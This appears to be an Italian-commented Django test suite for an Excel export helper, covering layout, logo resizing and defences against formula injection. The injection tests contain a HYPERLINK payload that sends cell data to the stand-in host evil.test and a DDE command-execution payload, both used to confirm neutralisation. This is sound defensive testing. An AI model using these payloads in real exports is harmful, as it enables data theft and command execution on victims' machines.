from __future__ import annotations

import shutil
import tempfile
from io import BytesIO
from pathlib import Path
from types import SimpleNamespace
from unittest import mock

from django.test import TestCase

from openpyxl import Workbook, load_workbook

from core.excel_export import _brand_header, build_xlsx_bytes


class ExcelExportUtilTests(TestCase):
    # TestCase (non SimpleTestCase): con `title` valorizzato build_xlsx_bytes
    # legge il branding via PdfTheme.from_branding() (query DB SiteConfig).
    def test_build_xlsx_bytes_valid(self):
        from openpyxl import load_workbook

        from core.excel_export import build_xlsx_bytes

        data = build_xlsx_bytes(
            columns=["A", "B"], rows=[["x", 1], ["y", 2]], title="Titolo", sheet_title="Foglio"
        )
        self.assertEqual(data[:2], b"PK")  # firma xlsx (zip)

        ws = load_workbook(BytesIO(data)).active
        self.assertEqual(ws.title, "Foglio")
        # Con `title` valorizzato il blocco intestazione HUB sposta titolo/header:
        # titolo in A3, header tabella in riga 7 (vedi XlsxDocumentHeaderTests).
        self.assertEqual(ws.cell(row=3, column=1).value, "Titolo")
        self.assertEqual(ws.cell(row=7, column=1).value, "A")
        self.assertEqual(ws.cell(row=8, column=2).value, 1)

    def test_make_xlsx_response(self):
        from core.excel_export import make_xlsx_response

        resp = make_xlsx_response(filename='c"on.xlsx', columns=["A"], rows=[["x"]])
        self.assertEqual(resp.status_code, 200)
        self.assertIn("spreadsheetml", resp["Content-Type"])
        self.assertIn('filename="con.xlsx"', resp["Content-Disposition"])  # virgolette interne ripulite
        self.assertEqual(resp.content[:2], b"PK")


class XlsxDocumentHeaderTests(TestCase):
    def test_header_block_contains_title_subtitle_and_filters(self):
        data = build_xlsx_bytes(
            columns=["Nominativo", "Reparto"],
            rows=[["Mario Bianchi", "Officina"]],
            title="Elenco dipendenti",
            subtitle="Generato il 12-07-2026 da Mario Rossi",
            filters_label="Filtri: Reparto = Officina · 1 righe",
        )
        ws = load_workbook(BytesIO(data)).active
        self.assertEqual(ws["A3"].value, "Elenco dipendenti")
        self.assertEqual(ws["A4"].value, "Generato il 12-07-2026 da Mario Rossi")
        self.assertEqual(ws["A5"].value, "Filtri: Reparto = Officina · 1 righe")
        self.assertEqual(ws["A7"].value, "Nominativo")
        self.assertEqual(ws["A8"].value, "Mario Bianchi")
        self.assertEqual(ws.freeze_panes, "A8")

    def test_without_title_header_stays_on_first_row(self):
        data = build_xlsx_bytes(columns=["Nominativo"], rows=[["Mario Bianchi"]])
        ws = load_workbook(BytesIO(data)).active
        self.assertEqual(ws["A1"].value, "Nominativo")
        self.assertEqual(ws["A2"].value, "Mario Bianchi")

    def test_header_uses_print_title_rows_for_repeated_header(self):
        # ws.print_title_rows definisce l'area di stampa con riga header ripetuta:
        # requisito di progetto, non va rimosso (vedi consegna del task).
        data = build_xlsx_bytes(
            columns=["Nominativo"],
            rows=[["Mario Bianchi"]],
            title="Elenco dipendenti",
        )
        ws = load_workbook(BytesIO(data)).active
        self.assertEqual(ws.print_title_rows, "$7:$7")


class BrandHeaderLogoResizeTests(TestCase):
    """Copre il bug: img.height veniva sovrascritto PRIMA di calcolare il
    rapporto d'aspetto per img.width, quindi il logo usciva distorto
    (larghezza nativa in pixel invece che proporzionale a 36px di altezza).
    """

    def setUp(self):
        self._tmpdir = tempfile.mkdtemp(prefix="excel_export_logo_")
        self.addCleanup(shutil.rmtree, self._tmpdir, ignore_errors=True)

    def _make_logo(self, width, height):
        from PIL import Image as PILImage

        logo_path = Path(self._tmpdir) / "logo.png"
        PILImage.new("RGB", (width, height), color="white").save(logo_path)
        return str(logo_path)

    def test_logo_is_resized_proportionally_not_distorted(self):
        logo_path = self._make_logo(400, 100)
        fake_theme = SimpleNamespace(portal_name="NOVICROM HUB", logo_path=logo_path)

        wb = Workbook()
        ws = wb.active

        with mock.patch("core.pdf.PdfTheme.from_branding", return_value=fake_theme):
            _brand_header(ws, title="T", subtitle=None, filters_label=None, logo=True)

        self.assertEqual(len(ws._images), 1)
        img = ws._images[0]
        # Altezza forzata a 36px; larghezza proporzionale (400 * 36/100 = 144),
        # non la larghezza nativa (400) come nel bug originale.
        self.assertEqual(img.height, 36)
        self.assertEqual(img.width, 144)

    def test_logo_resize_with_different_aspect_ratio(self):
        # Logo quasi quadrato: 120x100 -> larghezza attesa 43 (120 * 36/100 = 43.2 -> int 43)
        logo_path = self._make_logo(120, 100)
        fake_theme = SimpleNamespace(portal_name="NOVICROM HUB", logo_path=logo_path)

        wb = Workbook()
        ws = wb.active

        with mock.patch("core.pdf.PdfTheme.from_branding", return_value=fake_theme):
            _brand_header(ws, title="T", subtitle=None, filters_label=None, logo=True)

        img = ws._images[0]
        self.assertEqual(img.height, 36)
        self.assertEqual(img.width, 43)


class XlsxFormulaInjectionTests(TestCase):
    """Le stringhe non devono MAI diventare formule vive nel file prodotto.

    openpyxl tipizza in base al valore: una stringa che inizia con "=" verrebbe
    scritta come formula (data_type 'f'). I dati degli export arrivano dal DB e
    dalla querystring (l'etichetta filtri riflette ?q=), quindi sono controllabili
    da un attaccante.
    """

    def _sheet(self, **kwargs):
        data = build_xlsx_bytes(**kwargs)
        return load_workbook(BytesIO(data)).active

    def test_string_starting_with_equals_is_not_a_live_formula(self):
        ws = self._sheet(
            columns=["Nome"],
            rows=[["=HYPERLINK(\"http://evil.test?d=\"&A2,\"clicca\")"]],
        )
        cell = ws.cell(row=2, column=1)
        self.assertNotEqual(cell.data_type, "f")
        self.assertEqual(cell.data_type, "s")
        self.assertTrue(cell.quotePrefix)

    def test_all_dangerous_prefixes_are_neutralized(self):
        pericolose = ["=1+1", "+1", "-1+1", "@SUM(A1)", "\tx", "\rx"]
        ws = self._sheet(columns=["V"], rows=[[v] for v in pericolose])
        for i, v in enumerate(pericolose, start=2):
            cell = ws.cell(row=i, column=1)
            self.assertNotEqual(cell.data_type, "f", f"{v!r} scritta come formula")
            self.assertTrue(cell.quotePrefix, f"{v!r} senza quote prefix")

    def test_value_is_not_altered(self):
        # Nessun apice aggiunto al contenuto: -12,50 resta -12,50.
        ws = self._sheet(columns=["Importo"], rows=[["-12,50"]])
        self.assertEqual(ws.cell(row=2, column=1).value, "-12,50")

    def test_non_string_values_stay_typed(self):
        ws = self._sheet(columns=["N"], rows=[[42], [3.5]])
        self.assertEqual(ws.cell(row=2, column=1).value, 42)
        self.assertEqual(ws.cell(row=3, column=1).value, 3.5)
        self.assertNotEqual(ws.cell(row=2, column=1).data_type, "s")

    def test_filters_label_from_querystring_is_neutralized(self):
        # L'etichetta filtri riflette la querystring: e' la superficie piu' esposta.
        # Il quote prefix scatta solo se la stringa INIZIA con un carattere
        # pericoloso; in ogni caso non deve mai diventare una formula viva.
        ws = self._sheet(
            columns=["X"], rows=[["ok"]], title="Report",
            filters_label='=cmd|\' /c calc\'!A1',
        )
        cell = ws.cell(row=5, column=1)
        self.assertNotEqual(cell.data_type, "f")
        self.assertTrue(cell.quotePrefix)

    def test_filters_label_with_safe_prefix_is_text_without_quote_prefix(self):
        ws = self._sheet(
            columns=["X"], rows=[["ok"]], title="Report",
            filters_label='Ricerca: "=1+1"',
        )
        cell = ws.cell(row=5, column=1)
        self.assertEqual(cell.data_type, "s")
        self.assertFalse(cell.quotePrefix)
